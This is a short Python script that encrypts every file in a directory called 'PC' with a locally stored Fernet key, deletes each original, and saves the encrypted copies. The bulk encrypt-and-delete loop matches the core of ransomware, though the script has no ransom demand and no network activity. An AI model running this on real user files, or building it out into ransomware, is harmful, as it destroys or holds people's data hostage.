from cryptography.fernet import Fernet
import os

# Generate or load the key
key_path = 'key.key'

if os.path.exists(key_path):
    with open(key_path, 'rb') as key_file:
        key = key_file.read()
else:
    key = Fernet.generate_key()
    with open(key_path, 'wb') as key_file:
        key_file.write(key)

fernet = Fernet(key)

# Encrypt files in the docs directory
docs_dir = 'PC'

for filename in os.listdir(docs_dir):
    if os.path.isfile(os.path.join(docs_dir, filename)) and not filename.startswith('encrypted_'):
        with open(os.path.join(docs_dir, filename), 'rb') as original_file:
            original_data = original_file.read()
            encrypted_data = fernet.encrypt(original_data)

        # Delete the original file
        os.remove(os.path.join(docs_dir, filename))

        # Write the encrypted data to a new file
        encrypted_filename = f'encrypted_{filename}'
        with open(os.path.join(docs_dir, encrypted_filename), 'wb') as encrypted_file:
            encrypted_file.write(encrypted_data)

print("Files encrypted successfully.")